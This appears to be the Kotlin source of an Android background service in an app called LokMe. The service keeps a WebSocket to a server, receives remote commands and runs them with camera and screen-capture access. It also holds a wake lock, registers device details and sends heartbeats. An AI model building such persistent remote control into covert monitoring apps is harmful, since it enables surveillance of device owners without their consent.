package com.lokme.service

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.lifecycle.LifecycleService
import com.lokme.LokMeApp
import com.lokme.MainActivity
import com.lokme.R
import com.lokme.network.SupabaseClient
import com.lokme.network.WsClient
import com.lokme.screen.ScreenCaptureHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch

class CommandService : LifecycleService() {

    private var wsClient: WsClient? = null
    private var executor: CommandExecutor? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var deviceId: String = ""
    private var heartbeatThread: Thread? = null

    companion object {
        private const val TAG = "CommandService"
        var isRunning = false
            private set
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        LokMeApp.setServiceShouldRun(this, true)
        try {
            ensureNotificationChannel()
            deviceId = SupabaseClient.getDeviceId(this)
            executor = CommandExecutor(this)
            executor?.initCamera(this)
            acquireWakeLock()
            ScreenCaptureHelper.setupProjection(this)
            Log.d(TAG, "Service created, device: $deviceId")
        } catch (e: Exception) {
            Log.e(TAG, "Error in onCreate: ${e.message}", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        try {
            startForeground(1, buildNotification())
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground: ${e.message}", e)
        }
        connectWebSocket()
        return START_STICKY
    }

    private fun connectWebSocket() {
        try {
            wsClient = WsClient(
                url = LokMeApp.SERVER_URL,
                onCommand = { commandType, commandId, payload ->
                    handleCommand(commandType, commandId, payload)
                },
                onConnected = {
                    Log.d(TAG, "WebSocket connected")
                    scope.launch {
                        try {
                            SupabaseClient.registerDevice(
                                this@CommandService,
                                deviceName = Build.MODEL,
                                deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}",
                                androidVersion = "Android ${Build.VERSION.RELEASE}"
                            )
                            SupabaseClient.updateDeviceOnline(this@CommandService, true)
                        } catch (e: Exception) {
                            Log.e(TAG, "Online update failed: ${e.message}")
                        }
                    }
                },
                onDisconnected = {
                    Log.d(TAG, "WebSocket disconnected")
                }
            )
            wsClient?.connect(deviceId)
            Log.d(TAG, "WebSocket connection initiated")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create WebSocket: ${e.message}", e)
        }

        heartbeatThread?.interrupt()
        heartbeatThread = Thread {
            try {
                while (isRunning && !Thread.currentThread().isInterrupted) {
                    Thread.sleep(60_000)
                    try {
                        wsClient?.sendHeartbeat(deviceId)
                    } catch (e: Exception) {
                        Log.e(TAG, "Heartbeat error: ${e.message}")
                    }
                }
            } catch (_: InterruptedException) { }
        }
        heartbeatThread?.isDaemon = true
        heartbeatThread?.start()
    }

    private fun handleCommand(commandType: String, commandId: String, payload: String) {
        Log.d(TAG, "Received command: $commandType ($commandId)")

        val client = wsClient ?: return

        try {
            executor?.execute(
                commandType = commandType,
                commandId = commandId,
                payload = payload,
                deviceId = deviceId,
                wsClient = client,
                onSuccess = { data ->
                    try {
                        client.sendResponse(commandId, deviceId, commandType, true, data)
                    } catch (e: Exception) {
                        Log.e(TAG, "sendResponse error: ${e.message}")
                    }
                    scope.launch {
                        try {
                            SupabaseClient.updateCommandStatus(commandId, "completed")
                        } catch (_: Exception) {}
                    }
                },
                onError = { error ->
                    try {
                        client.sendResponse(commandId, deviceId, commandType, false, error)
                    } catch (e: Exception) {
                        Log.e(TAG, "sendResponse error: ${e.message}")
                    }
                    scope.launch {
                        try {
                            SupabaseClient.updateCommandStatus(commandId, "failed")
                        } catch (_: Exception) {}
                    }
                }
            )
        } catch (e: Exception) {
            Log.e(TAG, "Command execution error: ${e.message}", e)
        }
    }

    private fun buildNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        return Notification.Builder(this, LokMeApp.CHANNEL_ID)
            .setContentTitle(getString(R.string.notification_title))
            .setContentText(getString(R.string.notification_text))
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "lokme:service")
            wakeLock?.acquire(24 * 60 * 60 * 1000L)
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock error: ${e.message}")
        }
    }

    private fun ensureNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                LokMeApp.CHANNEL_ID,
                "LokMe Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "LokMe monitoring service"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        isRunning = false
        heartbeatThread?.interrupt()
        heartbeatThread = null
        try { wsClient?.close() } catch (_: Exception) {}
        try { wakeLock?.let { if (it.isHeld) it.release() } } catch (_: Exception) {}
        ScreenCaptureHelper.cleanup()
        scope.launch {
            try {
                SupabaseClient.updateDeviceOnline(this@CommandService, false)
            } catch (_: Exception) {}
        }
        scope.cancel()
        super.onDestroy()
    }

    private fun scheduleRestart() {
        try {
            val intent = Intent(this, RestartServiceReceiver::class.java)
            val pendingIntent = PendingIntent.getBroadcast(
                this, 0, intent,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            alarmManager.set(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 10_000,
                pendingIntent
            )
            Log.d(TAG, "Scheduled restart in 10s")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule restart: ${e.message}")
        }
    }
}
